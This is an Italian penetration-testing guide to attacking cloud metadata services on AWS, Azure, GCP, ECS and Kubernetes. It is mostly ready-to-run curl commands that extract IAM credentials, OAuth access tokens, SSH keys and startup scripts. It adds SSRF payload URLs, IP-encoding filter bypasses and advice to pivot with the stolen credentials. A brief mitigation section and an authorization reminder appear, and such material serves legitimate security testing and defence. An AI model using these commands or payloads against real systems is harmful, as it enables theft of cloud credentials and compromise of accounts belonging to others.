# Metadata Service Attacks

## Scopo

Questa guida copre gli attacchi ai metadata service (IMDS) delle piattaforme cloud, una tecnica critica per ottenere credenziali e informazioni sensibili da istanze cloud.

## Prerequisiti

- Accesso a istanza cloud o SSRF
- Conoscenza AWS/Azure/GCP
- curl o tool HTTP
- **Autorizzazione per testing**

---

## Concetto

```
Ogni cloud provider espone un metadata service
accessibile solo dall'interno dell'istanza
su IP link-local: 169.254.169.254

Contiene:
- Credenziali temporanee
- Configurazione istanza
- User data/startup scripts
- Network configuration
```

---

## AWS IMDSv1

### Endpoint Base

```bash
# Root
curl http://169.254.169.254/latest/meta-data/

# Risultato
ami-id
hostname
instance-id
instance-type
local-ipv4
iam/
```

### Credenziali IAM

```bash
# Lista ruoli
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Ottieni credenziali
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# Output
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2024-01-15T12:00:00Z"
}
```

### Utilizzo Credenziali

```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

aws sts get-caller-identity
aws s3 ls
```

### User Data

```bash
# Può contenere scripts con secrets
curl http://169.254.169.254/latest/user-data
```

### Altre Info Utili

```bash
# Region
curl http://169.254.169.254/latest/meta-data/placement/region

# Account ID (da identity document)
curl http://169.254.169.254/latest/dynamic/instance-identity/document

# Public keys
curl http://169.254.169.254/latest/meta-data/public-keys/
```

---

## AWS IMDSv2

### Differenze

```
IMDSv2 richiede token session-based
- Mitiga SSRF semplici
- Header hop-by-hop filtrano richieste

Ma bypass possibili in alcuni scenari
```

### Token Request

```bash
# Ottieni token (TTL 21600 sec = 6 ore)
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  http://169.254.169.254/latest/api/token)

# Usa token
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### SSRF Bypass IMDSv2

```
IMDSv2 può essere bypassato se:
- SSRF permette header custom
- Application fa proxy senza filtrare header
- DNS rebinding
```

---

## Azure IMDS

### Endpoint Base

```bash
# Richiede header Metadata: true
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq

# Senza header = 400 Bad Request
```

### Access Token

```bash
# Token per Azure Resource Manager
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Token per altri servizi
# Storage
resource=https://storage.azure.com/

# Key Vault
resource=https://vault.azure.net/

# Graph
resource=https://graph.microsoft.com/
```

### Utilizzo Token

```bash
# Con Azure CLI
az login --identity

# O manualmente
curl -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

### Info Istanza

```bash
# Compute info
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01"

# Network
curl -H "Metadata:true" \
  "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01"
```

---

## GCP Metadata

### Endpoint Base

```bash
# Richiede header Metadata-Flavor: Google
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/

# Alternativo
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/
```

### Access Token

```bash
# Token default SA
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Output
{
  "access_token": "ya29...",
  "expires_in": 3600,
  "token_type": "Bearer"
}
```

### Scopes

```bash
# Verifica scopes SA
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes"
```

### Utilizzo Token

```bash
curl -H "Authorization: Bearer ya29..." \
  "https://www.googleapis.com/storage/v1/b?project=PROJECT_ID"
```

### SSH Keys

```bash
# Project-wide SSH keys
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Instance-specific
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys"
```

### Startup Script

```bash
# Può contenere secrets
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script"
```

---

## SSRF Exploitation

### Scenario

```
Applicazione web vulnerabile a SSRF
Accede a metadata service internamente
Esfiltrazione credenziali
```

### Payloads

```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# GCP
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Bypass Filtri

```bash
# IP alternativi
http://[::ffff:169.254.169.254]/
http://169.254.169.254.xip.io/
http://2852039166/  # Decimal
http://0xa9fea9fe/  # Hex
http://0251.0376.0251.0376/  # Octal

# DNS rebinding
# Hostname che risolve a 169.254.169.254
```

---

## Container Metadata

### ECS (AWS)

```bash
# Task metadata
curl $ECS_CONTAINER_METADATA_URI_V4
curl $ECS_CONTAINER_METADATA_URI_V4/task

# Credenziali
curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### Kubernetes

```bash
# Service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# API Server
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces
```

---

## Mitigazioni

### AWS

```bash
# Forza IMDSv2
aws ec2 modify-instance-metadata-options \
    --instance-id i-xxx \
    --http-tokens required \
    --http-endpoint enabled
```

### Azure

```
- Network Security Groups
- Firewall rules
- Managed Identity con least privilege
```

### GCP

```
- Metadata concealment
- Workload Identity
- Service account scoping
```

### Applicazione

```
- Blocca accesso a link-local da app
- Valida URL in SSRF-prone features
- Web Application Firewall
```

---

## Best Practices

- **Enumeration**: Mappa tutti i dati disponibili
- **Pivoting**: Usa credenziali per lateral movement
- **Scope**: Solo risorse autorizzate
- **Cleanup**: Non mantenere accesso non autorizzato
- **Report**: Documenta tutti i path di attacco

## Riferimenti

- [AWS IMDS Documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)
- [Azure IMDS](https://docs.microsoft.com/azure/virtual-machines/linux/instance-metadata-service)
- [GCP Metadata Server](https://cloud.google.com/compute/docs/metadata/overview)
- [SSRF to Cloud Credentials](https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af)
